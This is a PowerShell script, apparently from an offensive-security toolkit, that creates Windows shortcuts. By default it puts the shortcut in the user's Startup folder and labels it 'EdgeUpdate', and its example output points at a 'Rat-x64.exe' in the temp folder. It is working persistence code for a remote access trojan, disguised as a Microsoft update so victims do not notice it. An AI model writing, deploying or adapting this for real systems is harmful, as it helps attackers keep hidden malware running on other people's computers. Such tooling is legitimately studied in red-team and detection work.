<#
.SYNOPSIS

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
	Creates an shortcut file that accepts cmdline arguments to execute.

.Parameter target
   The absolucte path of appl\script to execute (default: notepad.exe)

.Parameter Args
   The appl\script arguments to execute (default: false)

.Parameter shortcut
   The absolucte path where to create sortcut.lnk (default: Startup)

.Parameter description
   The shortcut description field (default: EdgeUpdate)

.Parameter wdirectory
   The shortcut working directory (default: $Env:TMP)

.EXAMPLE
	PS> .\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\SH.exe" -description "EdgeUpdate"
    read contents from '$Env:TMP\SH.ps1', creates '$Env:TMP\SH.exe', creates shortcut pointing to '$Env:TMP\SH.exe' on startup folder

.OUTPUTS
   * Created new shortcut : 'C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Rat-x64.lnk'
     => Target application: 'C:\Users\pedro\AppData\Local\Temp\Rat-x64.exe'

.LINK
	https://github.com/fleschutz/PowerShell
#>


#CmdLet Global variable declarations!
 [CmdletBinding(PositionalBinding=$false)] param(
   [string]$shortcut="$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
   [string]$target="$Env:WINDIR\System32\notepad.exe",
   [string]$description="EdgeUpdate",
   [string]$Wdirectory="$Env:TMP",
   [string]$Args="False"
)


Write-Host ""
#Check cmdlet mandatory dependencies
$ErrorActionPreference = "SilentlyContinue"
If($target -iNotMatch '(.exe|.ps1|.bat)$')
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host " Error: -target only accepts '" -ForegroundColor DarkGray -NoNewline
   write-host "exe,ps1,bat" -ForegroundColor Red -NoNewline
   write-host "' extensions." -ForegroundColor DarkGray
   return
}
If(-not(Test-Path -Path "$target"))
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host " Notfound: '" -ForegroundColor DarkGray -NoNewline
   write-host "$target" -ForegroundColor Red -NoNewline
   write-host "'`n" -ForegroundColor DarkGray
   return
}
If(-not($Wdirectory))
{
   write-host "+ " -ForegroundColor Darkellow -NoNewline
   write-host " Notfound: '" -ForegroundColor DarkGray -NoNewline
   write-host "$Wdirectory" -ForegroundColor Red -NoNewline
   write-host "'`n" -ForegroundColor DarkGray
   New-Item -Name "$Wdirectory" -ItemType folder -Force|Out-Null
}


#Split path to extract last string
$RawTargetName = $target.Split('\')[-1] -replace '(.exe|.ps1|.bat)$','' # notepad
$FinalName = "$shortcut"+"\$RawTargetName.lnk" -Join '' # C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notepad.lnk

If(Test-Path -Path "$FinalName")
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host " Duplicate entry detected: '" -ForegroundColor DarkGray -NoNewline
   write-host "$FinalName" -ForegroundColor Red -NoNewline
   write-host "'`n" -ForegroundColor DarkGray
   return
}

try{

   $WScriptShell = New-Object -ComObject WScript.Shell
   $Sh = $WScriptShell.CreateShortcut("$FinalName")
   If($target -iMatch '(.ps1)$')
   {
      If($Args -ieq "False")
      {
         $Sh.TargetPath = "$PSHOME\Powershell.exe"
         $Sh.Arguments = "-File $target" ## <-- shortcut cmdline arguments!
      }
      Else
      {
         $Sh.TargetPath = "$PSHOME\Powershell.exe"
         $Sh.Arguments = "-File $target $Args" ## <-- shortcut cmdline arguments!      
      }
   }
   ElseIf($target -iMatch '(.bat)$')
   {
      If($Args -ieq "False")
      {
         $Sh.TargetPath = "cmd.exe"
         $Sh.Arguments = "/c start $target" ## <-- shortcut cmdline arguments!
      }
      Else
      {
         $Sh.TargetPath = "cmd.exe"
         $Sh.Arguments = "/c start $target $Args" ## <-- shortcut cmdline arguments!      
      }
   }
   Else
   {
      If($Args -ieq "False")
      {
         $Sh.TargetPath = "$target"
      }
      Else
      {
         $Sh.TargetPath = "$target"
         $Sh.Arguments = "$Args" ## <-- shortcut cmdline arguments!      
      }
   }
   $Sh.WindowStyle = "1"
   $Sh.WorkingDirectory = "$Wdirectory"
   $Sh.Description = "$description"
   $Sh.Save()

   Write-Host "`n* Created new shortcut : '$FinalName'" -ForegroundColor Green
   Write-Host "  => Target application: '$target'" -ForegroundColor Blue
}catch{
   #Error creating shortcut!
   Write-Error "`nError in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
}
Write-Host ""
